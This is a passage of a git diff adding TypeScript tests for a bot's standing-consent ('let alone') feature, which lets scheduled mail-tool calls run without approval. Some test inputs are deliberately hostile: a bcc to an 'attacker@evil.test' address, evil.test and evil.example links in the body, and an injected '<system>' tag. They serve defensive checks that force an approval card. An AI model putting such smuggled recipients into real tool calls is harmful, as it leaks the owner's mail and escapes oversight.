@@ -1,6 +1,9 @@
+import * as alone from '../../src/mms/bots/actions/BotAlone'
+import { BOT_CHAT_INSTRUCTIONS, botInstructions } from '../../src/mms/bots/instructions'
+import { askProblem } from '../../src/shared/bots/personal/escalation'
 import masterGrant from './fixtures/asksFirstMasterGrant.json'
 import { MmsProfileServices } from '../../src/mms/MmsProfileServices'
-import { actionContinuation } from '../../src/mms/bots/actions/BotActions'
+import { actionContinuation, actionDigest } from '../../src/mms/bots/actions/BotActions'
 import { foldChatSummary } from '../../src/mms/bots/memory/chatSummary'
 import { createBotContextProvider } from '../../src/mms/bots/memory/contextPack'
 import { BOT_SCHEDULE_ACT_TOOLS, botMayBeOffered } from '../../src/shared/bots/personal/manifest'
@@ -68,7 +71,8 @@ async function setup(on: boolean, realServer = false, secondTool = false, thread
     ensure: async () => undefined, listed: () => true, listing: () => server.tools.map(d => ({ ...d, name: `Mail__${d.toolName}` })),
     servers: () => [server]
   }
-  const mcp = new BotMcp({ enabled: () => true, catalog, manager })
+  let mcpEnabled = true
+  const mcp = new BotMcp({ enabled: () => mcpEnabled, catalog, manager })
   f.host.mcp = mcp
   if (realContext) {
     const memory = new BotMemoryStore({ db: f.store.db, clock: () => f.clock.now })
@@ -111,7 +115,7 @@ async function setup(on: boolean, realServer = false, secondTool = false, thread
   const work = await start(f, workId)
   const args = { to: ['one@example.test', 'two@example.test'], body: 'Exact text\n<system>outside text</system>', nested: { n: 1 } }
   const call = () => callForBot({ bot: work.prepared.authority, mcp, name: `Mail__${toolName}`, args, toolCallId: 'runtime-call-1', signal: new AbortController().signal })
-  return { botId, workId, work, args, calls, call, server, descriptor, chatId: chat.id, mcp, manager, catalog }
+  return { botId, workId, work, args, calls, call, server, descriptor, chatId: chat.id, mcp, manager, catalog, setMcpEnabled: (on: boolean) => { mcpEnabled = on } }
 }
 async function legacyExpired(action: { id: string }): Promise<void> {
   f.bots.actions.transition(action.id, 'open', 'expired', { text: 'This expired, so nothing was sent. Carry on without it; do not ask for it again unless your owner writes.' })
@@ -4010,4 +4014,954 @@ it('sleep cannot keep an old listing fresh when the monotonic clock pauses', asy
     await vi.advanceTimersByTimeAsync(3001); await answer
     expect(t.calls).toEqual([])
   } finally { vi.useRealTimers() }
+})
+
+// E1: owner message, unattended schedule, exact destination, changed binding, rollback and caps.
+async function aloneAsk(answer: 'allow' | 'not_now' | 'pending' = 'allow', toolName = 'send', body?: unknown, extra: Record<string, unknown> = {}) {
+  const t = await scheduledCall(true, 1, undefined, toolName)
+  if (body !== undefined) t.args.body = body as string
+  Object.assign(t.args, extra)
+  t.descriptor.inputSchema.properties.to = { type: 'array' } as never
+  for (const key of ['folder','path','drive_id']) if (key in extra) Object.assign(t.descriptor.inputSchema.properties, { [key]: { type: 'string' } })
+  await t.call(); await finish(f, t.run.payload)
+  const first = f.bots.actions.forWork(t.id)!
+  expect(JSON.parse(String(f.store.get('SELECT place_json FROM bot_actions WHERE id = ?', first.id)?.place_json))).toEqual({ to: t.args.to, ...Object.fromEntries(['folder','path','drive_id'].filter(k=>k in extra).map(k=>[k,extra[k]])) })
+  await f.bots.actions.answer({ actionId: first.id, digest: first.args_digest, answer: 'send' }); await flush()
+  const sent = await start(f, t.id, 2); await finish(f, sent.payload)
+  await f.bots.service.chatSend({ botId: t.botId, text: 'Let this automation send there without asking', clientRequestId: 'alone-owner' })
+  const row = f.store.laneActivations(t.botId, 'chat', ['running'])[0]!
+  const chat = await start(f, row.id)
+  const request = { ask: 'let_alone', scheduleId: t.schedule.scheduleId, serverId: 'mail', tool: toolName }
+  chat.prepared.authority.escalate!({ permission: request as never, reason: 'Do it alone' })
+  await finish(f, chat.payload, 'completed', { text: 'Allow this automation?' })
+  const ask = f.store.openAsks(t.botId).find(a => 'ask' in a.permission && a.permission.ask === 'let_alone')!
+  expect(ask).toBeDefined()
+  const card = f.bots.chat.card(ask)
+  expect(card.title).toContain('Mail')
+  expect(card).toMatchObject({ kind: 'permission', details: { items: expect.arrayContaining([expect.stringContaining('one@example.test')]) } })
+  expect(f.bots.service.askKind(t.botId, ask.id)).toBe('export_memory')
+  if (answer !== 'pending') await f.bots.service.answer(t.botId, ask.id, answer)
+  return { ...t, request, consent: ask, consentActivation: row.id }
+}
+async function aloneNext(t: Awaited<ReturnType<typeof aloneAsk>>, args = t.args) {
+  f.clock.now += 60_000
+  const due = await f.tickSchedules(new Date(f.clock.now))
+  const id = due.inserted[0]!
+  const turn = await start(f, id)
+  const result = await callForBot({ bot: turn.prepared.authority, mcp: t.mcp, name: `Mail__${t.request.tool}`, args, toolCallId: 'alone-next', signal: new AbortController().signal })
+  return { id, turn, result, action: f.bots.actions.forWork(id)! }
+}
+it('E1 Allow lets only the same schedule destination run on the action ledger without a card', async () => {
+  const t = await aloneAsk()
+  expect(f.bots.chat.detail(f.bots.definitionOf(t.botId), f.clock.now).permissions.find(p => p.id.startsWith('alone:'))).not.toHaveProperty('enabled')
+  const next = await aloneNext(t)
+  expect(next.result.text).toContain('delivered')
+  expect(next.action).toMatchObject({ status: 'done', card_json: null, exec_args: null })
+  expect(t.calls).toHaveLength(2)
+  expect(f.store.message(next.action.message_id)).toBeUndefined()
+})
+it('E1 Not now saves no exception', async () => {
+  const t = await aloneAsk('not_now')
+  expect(f.store.all("SELECT key FROM bot_memory_state WHERE key LIKE 'alone:%'")).toEqual([])
+  expect((await aloneNext(t)).action.status).toBe('open')
+})
+it.each(['place', 'schema', 'config', 'off', 'hour', 'day', 'removed'] as const)('E1 %s keeps asking', async change => {
+  const t = await aloneAsk()
+  let args = t.args
+  if (change === 'place') args = { ...args, to: ['elsewhere@example.test'] }
+  if (change === 'schema') t.descriptor.inputSchema.properties.extra = { type: 'string' } as never
+  if (change === 'config') t.server.configDigest = 'new-config'
+  if (change === 'removed') {
+    const item = f.bots.chat.detail(f.bots.definitionOf(t.botId), f.clock.now).permissions.find(p => p.id.startsWith('alone:'))!
+    f.bots.service.revokePermission(t.botId, item.id)
+  }
+  if (change === 'off') f.host.settings!.get().experimental.botAsksFirstOff = true
+  if (change === 'hour' || change === 'day') {
+    const first = f.bots.actions.forWork(t.id)!
+    const total = change === 'hour' ? 20 : 100
+    for (let i = 1; i < total; i++) f.store.run(`INSERT INTO bot_actions SELECT ? , ?, bot_id, activation_id, lane, kind, target_json, NULL, args_json, args_digest, binding_json, place_json, card_json, bot_note, status, result_json, message_id, next_at, nudges, expires_at, answered_at, answered_device, created_at, ? FROM bot_actions WHERE id = ?`, `cap-${i}`, `cap-key-${i}`, new Date(f.clock.now - (change === 'day' ? 2 * 3600_000 : 0)).toISOString(), first.id)
+  }
+  const next = await aloneNext(t, args)
+  if (change === 'off') { expect(next.action).toBeUndefined(); return }
+  expect(next.action.status).toBe('open')
+  if (change === 'schema' || change === 'config') expect(f.bots.alone.items(t.botId)).toEqual([])
+  if (change === 'hour' || change === 'day') {
+    expect(JSON.parse(next.action.card_json!).title).toBe(change === 'hour' ? `${f.bots.definitionOf(t.botId).name} has used this action 20 times this hour. Send this one too?` : `${f.bots.definitionOf(t.botId).name} has used tools 100 times today. Send this one too?`)
+    expect(f.bots.service.get(t.botId).summary.stateText).toContain('Send · Mail')
+    await f.bots.actions.answer({ actionId: next.action.id, digest: next.action.args_digest, answer: 'send' })
+    expect(f.bots.actions.get(next.action.id)?.status).toBe('done')
+  }
+})
+it('E1 a scheduled turn cannot ask for standing authority', async () => {
+  const t = await scheduledCall()
+  expect(t.run.prepared.authority.escalate!({ permission: { ask: 'let_alone', scheduleId: t.schedule.scheduleId, serverId: 'mail', tool: 'send' } as never, reason: 'alone' })).toBe('Only when your owner asks for it in their own message.')
+  expect(f.store.openAsks(t.botId)).toEqual([])
+})
+it('E1 revocation before dispatch invalidates an already approved automatic call', async () => {
+  const t = await aloneAsk()
+  const execute = vi.spyOn(f.host.mcp!, 'call')
+  const next = await aloneNext(t)
+  expect(execute).toHaveBeenCalledTimes(1)
+  expect(next.action.status).toBe('done')
+  const item = f.bots.chat.detail(f.bots.definitionOf(t.botId), f.clock.now).permissions.find(p => p.id.startsWith('alone:'))!
+  f.bots.service.revokePermission(t.botId, item.id)
+  f.store.run("UPDATE bot_actions SET status = 'approved', exec_args = ?, result_json = NULL WHERE id = ?", JSON.stringify(t.args), next.action.id)
+  await f.bots.actions.retryApproved()
+  expect(execute).toHaveBeenCalledTimes(1)
+  expect(f.bots.actions.get(next.action.id)?.status).toBe('withdrawn')
+})
+it.each(['no-history', 'no-place', 'off'] as const)('E1 refuses an owner ask with %s', async state => {
+  const t = await scheduledCall()
+  if (state !== 'no-place') t.descriptor.inputSchema.properties.to = { type: 'array' } as never
+  if (state === 'off') f.host.settings!.get().experimental.botAsksFirstOff = true
+  await f.bots.service.chatSend({ botId: t.botId, text: 'Let it act alone', clientRequestId: 'no-history' })
+  const row = f.store.laneActivations(t.botId, 'chat', ['running'])[0]!
+  const turn = await start(f, row.id)
+  expect(turn.prepared.authority.escalate!({ permission: { ask: 'let_alone', scheduleId: t.schedule.scheduleId, serverId: 'mail', tool: 'send' } as never, reason: 'Alone' })).toBe(state === 'off' ? 'Asks first is off' : state === 'no-place' ? "This tool doesn't say where it acts, so it always asks." : 'Let it ask once first. After you send one of these, I can ask to do it alone.')
+  expect(f.store.openAsks(t.botId)).toEqual([])
+})
+it.each(['time', 'prompt', 'pair', 'schedule', 'bot'] as const)('E1 cleans up exceptions after %s changes', async change => {
+  const t = await aloneAsk()
+  if (change === 'time' || change === 'prompt') {
+    f.bots.editSchedule(t.botId, () => f.scheduler.updateJob(t.schedule.jobId, change === 'time' ? { schedule: { kind: 'interval', minutes: 2 } } : { prompt: 'A new job' }))
+  }
+  if (change === 'pair') f.bots.narrowGrant(t.botId, m => ({ ...m, mcp: [] }))
+  if (change === 'schedule') f.bots.removeSchedule(t.botId, t.schedule.scheduleId)
+  if (change === 'bot') await f.bots.remove(t.botId)
+  expect(f.store.all("SELECT key FROM bot_memory_state WHERE key GLOB 'alone:*'")).toHaveLength(change === 'time' ? 1 : 0)
+})
+it('E1 an automatic send clears the scheduled decline reminder in the current and later runs', async () => {
+  const t = await aloneAsk()
+  // Legacy decline history with the same arguments remains eligible to be sent under new consent.
+  f.store.run("UPDATE bot_actions SET status = 'declined' WHERE activation_id = ?", t.id)
+  f.clock.now += 60_000
+  const due = await f.tickSchedules(new Date(f.clock.now)), id = due.inserted[0]!
+  const turn = await start(f, id)
+  expect(f.bots.scheduledReportLevel(id, 'quiet')).toBe('fyi')
+  await callForBot({ bot: turn.prepared.authority, mcp: t.mcp, name: 'Mail__send', args: t.args, toolCallId: 'clears-decline', signal: new AbortController().signal })
+  expect(f.bots.scheduledReportLevel(id, 'quiet')).toBe('quiet')
+})
+it('E1 an open consent keeps its original destination when a newer call finishes', async () => {
+  const t = await aloneAsk()
+  expect(f.bots.alone.prepare(t.botId, 'pending', t.request as never)).toBeUndefined()
+  const first = f.bots.alone.pending(t.botId, 'pending', t.request as never)!
+  f.store.run('UPDATE bot_actions SET place_json = ? WHERE activation_id = ?', JSON.stringify({ to: ['different@example.test'] }), t.id)
+  expect(f.bots.alone.prepare(t.botId, 'pending', t.request as never)).toBeUndefined()
+  expect(f.bots.alone.pending(t.botId, 'pending', t.request as never)).toEqual(first)
+})
+it('E1 replaying an automatic call returns its recorded result without sending twice', async () => {
+  const t = await aloneAsk()
+  const next = await aloneNext(t)
+  const again = await callForBot({ bot: next.turn.prepared.authority, mcp: t.mcp, name: 'Mail__send', args: t.args, toolCallId: 'alone-next', signal: new AbortController().signal })
+  expect(again).toMatchObject({ text: expect.stringContaining('delivered') })
+  expect(again.isError).not.toBe(true)
+  expect(f.store.activation(next.id)?.status).toBe('running')
+  expect(t.calls).toHaveLength(2)
+})
+
+it.each([
+  ['added bcc', (a: Record<string, unknown>) => ({ ...a, bcc: ['attacker@evil.test'] }), 'open'],
+  ['missing key', (a: Record<string, unknown>) => ({ to: a.to, body: a.body }), 'open'],
+  ['nested destination', (a: Record<string, unknown>) => ({ ...a, nested: { options: [{ path: '/elsewhere' }] } }), 'open'],
+  ['changed non-content', (a: Record<string, unknown>) => ({ ...a, nested: { n: 2 } }), 'open'],
+  ['address in body', (a: Record<string, unknown>) => ({ ...a, body: 'Read https://evil.test now' }), 'open'],
+  ['body alone', (a: Record<string, unknown>) => ({ ...a, body: 'A new plain message' }), 'done']
+] as const)('E1 argument contract: %s', async (_name, change, status) => {
+  const t = await aloneAsk()
+  const next = await aloneNext(t, change(t.args) as typeof t.args)
+  expect(next.action.status).toBe(status)
+  expect(t.calls).toHaveLength(status === 'done' ? 2 : 1)
+})
+
+it('E1 only the schedule activation can act alone, never its subagent', async () => {
+  const t = await aloneAsk()
+  f.clock.now += 60_000
+  const id = (await f.tickSchedules(new Date(f.clock.now))).inserted[0]!
+  const turn = await start(f, id)
+  await turn.prepared.authority.subagents!.start({ title: 'Sender', brief: 'Send mail', toolCallId: 'start-sender' })
+  const dispatch = f.store.dispatches(id).find(d => d.kind === 'subagent')!
+  const child = await start(f, id, dispatch.n)
+  await callForBot({ bot: child.prepared.authority, mcp: t.mcp, name: 'Mail__send', args: t.args, toolCallId: 'child-call', signal: new AbortController().signal })
+  expect(f.bots.actions.forWork(id)).toMatchObject({ status: 'open', card_json: expect.any(String) })
+  expect(t.calls).toHaveLength(1)
+})
+it('E1 in-flight automatic calls name no owner card and skip as running', async () => {
+  const t = await aloneAsk()
+  f.clock.now += 60_000
+  const id = (await f.tickSchedules(new Date(f.clock.now))).inserted[0]!
+  const turn = await start(f, id)
+  let release!: (v: unknown) => void
+  vi.mocked(t.manager.callTool).mockImplementationOnce(() => new Promise(r => { release = r }))
+  const call = (toolCallId: string) => callForBot({ bot: turn.prepared.authority, mcp: t.mcp, name: 'Mail__send', args: t.args, toolCallId, signal: new AbortController().signal })
+  const running = call('slow')
+  await flush()
+  expect((await call('slow')).text).toBe('This call is already running. Wait for its result before trying another call.')
+  expect((await call('parallel')).text).toBe('A call is already running. Wait for its result before trying another call.')
+  expect(f.store.activation(id)?.endReason).not.toBe('approval')
+  f.clock.now += 60_000
+  expect((await f.tickSchedules(new Date(f.clock.now))).inserted).toEqual([])
+  expect(f.book.get(t.botId, t.schedule.scheduleId)?.skip?.reason).toBe('previous_run_still_running')
+  release({ content: [{ type: 'text', text: 'delivered' }] })
+  await running
+})
+it('E1 restart tells the run an uncertain automatic outcome, finishes, and admits the next occurrence', async () => {
+  const t = await aloneAsk()
+  f.clock.now += 60_000
+  const id = (await f.tickSchedules(new Date(f.clock.now))).inserted[0]!
+  const turn = await start(f, id)
+  vi.mocked(t.manager.callTool).mockImplementationOnce(() => new Promise(() => {}))
+  void callForBot({ bot: turn.prepared.authority, mcp: t.mcp, name: 'Mail__send', args: t.args, toolCallId: 'interrupted', signal: new AbortController().signal })
+  await flush()
+  const action = f.bots.actions.forWork(id)!
+  expect(action.status).toBe('running')
+  f.runs.markTerminal(turn.payload.runId, 'interrupted', { interruptedBy: 'daemon_restart' })
+  f.bots.close(); f.bots = new BotEngine(f.host)
+  await f.bots.reconcileOnStartup(); await flush()
+  expect(f.bots.actions.get(action.id)?.status).toBe('uncertain')
+  const resumed = await start(f, id, 2)
+  expect(f.store.lastMainDispatch(id)?.prompt.text).toContain('check before trying again')
+  await finish(f, resumed.payload, 'completed', { text: 'The upload could not be confirmed.' })
+  expect(f.store.activation(id)?.status).toBe('done')
+  expect(f.store.message(action.message_id)).toBeUndefined()
+  expect((await aloneNext(t)).action.status).toBe('done')
+})
+it('E1 an uncertain automatic call gets a card under a new call id in the same run', async () => {
+  const t = await aloneAsk()
+  const next = await aloneNext(t)
+  f.store.run("UPDATE bot_actions SET status = 'uncertain' WHERE id = ?", next.action.id)
+  await callForBot({ bot: next.turn.prepared.authority, mcp: t.mcp, name: 'Mail__send', args: t.args, toolCallId: 'try-again', signal: new AbortController().signal })
+  expect(f.bots.actions.forWork(next.id)).toMatchObject({ status: 'open', card_json: expect.any(String) })
+  expect(t.calls).toHaveLength(2)
+})
+
+it.each(['saved', 'all', 'source', 'revoke'] as const)('E1 forgetting or revoking removes exceptions: %s', async kind => {
+  const t = await aloneAsk()
+  f.bots.alone.prepare(t.botId, 'abandoned', t.request as never)
+  const grant = f.store.activeGrant(t.botId)!
+  if (kind === 'saved' || kind === 'all') await f.bots.wipeMemory(t.botId, kind === 'saved' ? 'saved' : undefined)
+  if (kind === 'source') f.bots.actions.forgetText(t.botId, f.bots.actions.forWork(t.id)!.id)
+  if (kind === 'revoke') { f.bots.revoke(t.botId); f.bots.approve(t.botId, botManifestDigest(f.bots.definitionOf(t.botId).permissions)); f.store.approve(t.botId, grant.digest, grant.manifest) }
+  expect(f.store.all("SELECT key FROM bot_memory_state WHERE key GLOB 'alone:*' OR key GLOB 'alone-ask:*'")).toEqual([])
+})
+it('E1 clearing chat removes withdrawn consent snapshots', async () => {
+  const t = await aloneAsk('not_now')
+  const reply = await start(f, t.consentActivation, 2); await finish(f, reply.payload)
+  await f.bots.service.chatSend({ botId: t.botId, text: 'Ask again', clientRequestId: 'alone-again' })
+  const row = f.store.laneActivations(t.botId, 'chat', ['running'])[0]!
+  const turn = await start(f, row.id)
+  turn.prepared.authority.escalate!({ permission: t.request as never, reason: 'Again' })
+  await finish(f, turn.payload)
+  expect(f.store.all("SELECT key FROM bot_memory_state WHERE key GLOB 'alone-ask:*'")).toHaveLength(1)
+  await f.bots.clearChat(t.botId)
+  expect(f.store.all("SELECT key FROM bot_memory_state WHERE key GLOB 'alone-ask:*'")).toEqual([])
+})
+it('E1 exported action records omit exact local place values', async () => {
+  const t = await aloneAsk()
+  const memory = new BotMemoryStore({ db: f.store.db })
+  expect(memory.actions(t.botId).every(row => row.place_json == null)).toBe(true)
+})
+
+it('E1 changed consent settles without granting or leaving an Allow card', async () => {
+  const t = await aloneAsk('pending')
+  t.server.configDigest = 'changed'
+  await expect(f.bots.service.answer(t.botId, t.consent.id, 'allow')).resolves.toBeDefined()
+  expect(f.store.escalation(t.consent.id)?.status).toBe('withdrawn')
+  const continued = await start(f, t.consentActivation, 2)
+  expect(f.store.lastMainDispatch(t.consentActivation)?.prompt.text).toContain('Nothing was allowed')
+  await finish(f, continued.payload)
+  expect(f.store.activation(t.consentActivation)?.status).toBe('done')
+  expect(f.bots.chat.card(f.store.escalation(t.consent.id)!).note).toContain('changed')
+  expect(f.store.all("SELECT key FROM bot_memory_state WHERE key GLOB 'alone:*' OR key GLOB 'alone-ask:*'")).toEqual([])
+})
+it('E1 consent and About use verb phrases and place values joined in words', async () => {
+  const t = await aloneAsk('pending')
+  expect(f.bots.chat.card(t.consent).title).toBe('let ‘Send the email’ send to one@example.test and two@example.test in Mail without asking')
+  await f.bots.service.answer(t.botId, t.consent.id, 'allow')
+  const item = f.bots.chat.detail(f.bots.definitionOf(t.botId), f.clock.now).permissions.find(p => p.id.startsWith('alone:'))!
+  expect(item.title).toBe('‘Send the email’ sends to one@example.test and two@example.test in Mail without asking')
+  t.server.configDigest = 'changed'
+  expect(f.bots.alone.items(t.botId)).toEqual([])
+})
+it('E1 an MCP tool name without ask points to the let-alone request shape', async () => {
+  const t = await aloneAsk('not_now')
+  const reply = await start(f, t.consentActivation, 2); await finish(f, reply.payload)
+  await f.bots.service.chatSend({ botId: t.botId, text: 'Without asking please', clientRequestId: 'wrong-shape' })
+  const row = f.store.laneActivations(t.botId, 'chat', ['running'])[0]!
+  const turn = await start(f, row.id)
+  expect(turn.prepared.authority.escalate!({ permission: { tool: 'send' }, reason: 'Without asking' })).toBe("For an automation to use an MCP tool without asking, use {ask:'let_alone', scheduleId, serverId, tool}. Get scheduleId from bot_schedule_list, serverId from mcp_servers (id), and use the bare tool name.")
+})
+
+// Distinct histories pin the schedule, done and newest filters independently.
+function copyAloneSource(t: Awaited<ReturnType<typeof aloneAsk>>, id: string, place: unknown, status = 'done') {
+  const source = f.store.get('SELECT * FROM bot_actions WHERE activation_id = ?', t.id)!
+  const row = { ...source, id, call_key: id, place_json: JSON.stringify(place), status }
+  const keys = Object.keys(row)
+  f.store.run(`INSERT INTO bot_actions(${keys.join(',')}) VALUES(${keys.map(() => '?').join(',')})`, ...Object.values(row))
+}
+it('E1 consent uses only that automation’s newest sent call, skipping a newer declined call', async () => {
+  const t = await aloneAsk()
+  const other = f.bots.addSchedule(t.botId, { when: { kind: 'interval', minutes: 5 }, prompt: 'Another automation' }, 'owner')
+  expect(f.bots.alone.prepare(t.botId, 'other-ask', { ...t.request, ask: 'let_alone', scheduleId: other.scheduleId })).toContain('Let it ask once first')
+  copyAloneSource(t, 'newest-sent', { to: ['newest@example.test'] })
+  copyAloneSource(t, 'newest-declined', { to: ['declined@example.test'] }, 'declined')
+  expect(f.bots.alone.prepare(t.botId, 'history-ask', t.request as never)).toBeUndefined()
+  expect(f.bots.alone.pending(t.botId, 'history-ask', t.request as never)?.details.items).toEqual(['to: ["newest@example.test"]'])
+})
+it('E1 a prompt change is inert even when no pruning observer runs', async () => {
+  const t = await aloneAsk()
+  vi.spyOn(f.bots, 'editSchedule').mockImplementation((_botId, save) => save())
+  f.scheduler.updateJob(t.schedule.jobId, { prompt: 'Different task' })
+  expect(f.store.all("SELECT key FROM bot_memory_state WHERE key GLOB 'alone:*'")).toHaveLength(1)
+  expect(f.bots.alone.items(t.botId)).toEqual([])
+})
+it.each(['edit', 'remove', 'bot-remove'] as const)('E1 %s removes consent through the scheduler update path', async kind => {
+  const t = await aloneAsk()
+  if (kind === 'edit') {
+    vi.spyOn(f.bots, 'editSchedule').mockImplementation((_botId, save) => save())
+    f.scheduler.on('updated', () => f.bots.schedulesEdited(t.botId))
+    f.scheduler.updateJob(t.schedule.jobId, { prompt: 'New automation task' })
+  } else if (kind === 'remove') f.scheduler.deleteJob(t.schedule.jobId)
+  else {
+    vi.spyOn(f.bots, 'scheduleRemoved').mockImplementation(() => {})
+    f.bots.removeSchedule(t.botId, t.schedule.scheduleId)
+  }
+  expect(f.store.all("SELECT key FROM bot_memory_state WHERE key GLOB 'alone:*'")).toEqual([])
+})
+it.each(['identity', 'switched-off'] as const)('E1 %s makes standing consent inert', async kind => {
+  const t = await aloneAsk()
+  if (kind === 'identity') vi.spyOn(t.mcp, 'binding').mockImplementation(() => ({ configDigest: 'config-1', schemaDigest: 'same', identity: 'another-server' }) as never)
+  else {
+    const id = f.bots.chat.detail(f.bots.definitionOf(t.botId), f.clock.now).permissions.find(p => !p.id.startsWith('alone:') && p.title.includes('Mail'))!.id
+    f.store.keepDisabledPermission(t.botId, id, f.store.activeGrant(t.botId)!.manifest)
+  }
+  expect(f.bots.alone.items(t.botId)).toEqual([])
+})
+it('E1 the legacy respond Allow path saves the standing consent', async () => {
+  const t = await aloneAsk('pending')
+  await f.bots.respond({ escalationId: t.consent.id, answer: 'allow_bot' })
+  expect((await aloneNext(t)).action.card_json).toBeNull()
+})
+it.each(['web', 'threads'])('E1 an MCP tool named %s still needs its own standing-consent card', async tool => {
+  const t = await aloneAsk('pending', tool)
+  expect(f.store.escalation(t.consent.id)?.status).toBe('open')
+})
+it('E1 let-alone asks accept exactly their four fields', () => {
+  const request = { ask: 'let_alone', scheduleId: 's', serverId: 'mail', tool: 'send' }
+  expect(askProblem(request)).toBeUndefined()
+  expect(askProblem({ ...request, place: 'bot-selected' })).toBe('The automation ask is invalid.')
+  expect(askProblem({ ...request, tool: '' })).toBe('The automation ask is invalid.')
+})
+it.each([true, false])('E1 let-alone guidance follows the asks-first switch: %s', async on => {
+  const t = await setup(on)
+  f.host.instructions = botInstructions
+  await f.bots.service.chatSend({ botId: t.botId, text: 'Hi', clientRequestId: 'alone-guidance' })
+  const row = f.store.laneActivations(t.botId, 'chat', ['running'])[0]!
+  const turn = await start(f, row.id)
+  expect(turn.prepared.instructions?.includes("When your owner wants an automation to do one thing without asking")).toBe(on)
+  expect(BOT_CHAT_INSTRUCTIONS).not.toContain('let_alone')
+})
+it.each([true, false])('E1 let-alone guidance needs MCP allowed or askable: %s', async canAsk => {
+  const t = await setup(true)
+  f.host.instructions = botInstructions
+  f.bots.narrowGrant(t.botId, m => ({ ...m, mcp: [], appTools: canAsk ? m.appTools : m.appTools.filter(tool => tool !== 'escalate') }))
+  await f.bots.service.chatSend({ botId: t.botId, text: 'Hi', clientRequestId: 'alone-guidance-mcp' })
+  const row = f.store.laneActivations(t.botId, 'chat', ['running'])[0]!
+  const turn = await start(f, row.id)
+  expect(turn.prepared.instructions?.includes('let_alone')).toBe(canAsk)
+})
+it('E1 automatic calls neither introduce asks first again nor publish a nonexistent card', async () => {
+  const t = await aloneAsk()
+  f.store.run("DELETE FROM bot_memory_state WHERE key = 'asks-first:introduced'")
+  f.store.run("DELETE FROM bot_messages WHERE id = ?", `bm_asks_first_${t.botId}`)
+  const published = vi.spyOn(f.bots.chat, 'republish')
+  const next = await aloneNext(t)
+  expect(f.store.message(`bm_asks_first_${t.botId}`)).toBeUndefined()
+  expect(published).not.toHaveBeenCalledWith(next.action.message_id)
+})
+
+it.each(['tool', 'schedule', 'work', 'manual'] as const)('E1 consent grants no standing authority to another %s', async scope => {
+  const t = await aloneAsk()
+  let id: string, turn: Awaited<ReturnType<typeof start>>, name = 'Mail__send'
+  if (scope === 'tool') {
+    t.server.tools.push({ ...t.descriptor, toolName: 'other', providerName: 'mail_other' })
+    const grant = f.store.activeGrant(t.botId)!
+    const manifest = { ...grant.manifest, mcp: [...grant.manifest.mcp, { serverId: 'mail', tool: 'other', level: 'asks_first' as const }] }
+    f.store.approve(t.botId, botManifestDigest(manifest), manifest)
+    const revision = f.host.definitions.publishRevision({ ...f.bots.definitionOf(t.botId), permissions: manifest })
+    f.store.setPublished(t.botId, revision.revision!)
+    name = 'Mail__other'
+  }
+  if (scope === 'tool' || scope === 'schedule') {
+    const schedule = scope === 'tool' ? t.schedule : f.bots.addSchedule(t.botId, { when: { kind: 'interval', minutes: 1 }, prompt: 'Other automation' }, 'owner')
+    f.clock.now += 60_000
+    const due = await f.tickSchedules(new Date(f.clock.now))
+    id = due.inserted.find(id => { const trigger = f.store.activation(id)?.trigger; return trigger?.kind === 'schedule' && trigger.scheduleId === schedule.scheduleId })!
+    turn = await start(f, id)
+  } else if (scope === 'manual') {
+    const row = await f.bots.activate({ botId: t.botId, input: 'Send it now', clientRequestId: 'manual-alone' })
+    id = row.id; turn = await start(f, id)
+  } else {
+    const reply = await start(f, t.consentActivation, 2); await finish(f, reply.payload)
+    await f.bots.service.chatSend({ botId: t.botId, text: 'Send an email', clientRequestId: 'work-alone' })
+    const chat = f.store.laneActivations(t.botId, 'chat', ['running'])[0]!
+    const talking = await start(f, chat.id)
+    id = (await f.bots.tools.work.start(t.botId, chat.id, { title: 'Another email', brief: 'Send it', key: 'another-alone' })).workId
+    await finish(f, talking.payload)
+    turn = await start(f, id)
+  }
+  const result = await callForBot({ bot: turn.prepared.authority, mcp: t.mcp, name, args: t.args, toolCallId: 'outside-alone', signal: new AbortController().signal })
+  if (scope === 'manual') { expect(result.text).toContain("A run started by hand can't wait"); expect(f.bots.actions.forWork(id)).toBeUndefined() }
+  else expect(f.bots.actions.forWork(id)).toMatchObject({ status: 'open', card_json: expect.any(String) })
+  expect(t.calls).toHaveLength(1)
+})
+it('E1 replay does not park or fence the next automatic call in a live turn', async () => {
+  const t = await aloneAsk()
+  const next = await aloneNext(t)
+  const call = (toolCallId: string, args = t.args) => callForBot({ bot: next.turn.prepared.authority, mcp: t.mcp, name: 'Mail__send', args, toolCallId, signal: new AbortController().signal })
+  await call('alone-next')
+  expect((await call('new-content', { ...t.args, body: 'Next plain message' })).text).toContain('delivered')
+  expect(f.store.activation(next.id)).toMatchObject({ status: 'running', endReason: null })
+  expect(t.calls).toHaveLength(3)
+})
+
+it.each([
+  ['https://safe.example/path', 'https://changed.example/path'],
+  ['first@example.test', 'second@example.test'],
+  ['A note from @owner', 'A note from @stranger'],
+  ['A note from @所有者', 'A note from @別人'],
+  ['Read example.рф', 'Read changed.рф'],
+  ['Read safe.example', 'Read evil.example'],
+  [{ options: [{ path: '/sent' }], text: 'original' }, { options: [{ path: '/sent' }], text: 'changed' }],
+  ['Plain sent text', { options: [{ path: '/new' }] }]
+])('E1 new address tokens and changed nested destinations ask: %j', async (before, after) => {
+  const t = await aloneAsk('allow', 'send', before)
+  expect((await aloneNext(t, { ...t.args, body: after as string })).action.status).toBe('open')
+  expect(t.calls).toHaveLength(1)
+})
+it.each(['scheduleId', 'serverId', 'tool'] as const)('E1 wrong %s gives an id correction, not a changed-place instruction', async key => {
+  const t = await aloneAsk()
+  expect(f.bots.alone.prepare(t.botId, 'wrong-id', { ...t.request, ask: 'let_alone', [key]: 'not-an-id' })).toBe('I could not find that automation or MCP tool. Get scheduleId from bot_schedule_list, serverId (id) from mcp_servers, and use the bare tool name.')
+})
+
+it.each(['restart', 'same-run', 'sent-card'] as const)('E1 r2 uncertain target requires a card for every later call: %s', async kind => {
+  const t = await aloneAsk()
+  let id: string, turn: Awaited<ReturnType<typeof start>>
+  if (kind === 'restart') {
+    f.clock.now += 60_000
+    id = (await f.tickSchedules(new Date(f.clock.now))).inserted[0]!
+    turn = await start(f, id)
+    vi.mocked(t.manager.callTool).mockImplementationOnce(() => new Promise(() => {}))
+    void callForBot({ bot: turn.prepared.authority, mcp: t.mcp, name: 'Mail__send', args: t.args, toolCallId: 'r2-interrupted', signal: new AbortController().signal })
+    await flush()
+    f.runs.markTerminal(turn.payload.runId, 'interrupted', { interruptedBy: 'daemon_restart' })
+    f.bots.close(); f.bots = new BotEngine(f.host)
+    await f.bots.reconcileOnStartup(); await flush()
+    turn = await start(f, id, 2)
+  } else {
+    vi.mocked(t.manager.callTool).mockRejectedValueOnce(new Error('Connection closed after dispatch'))
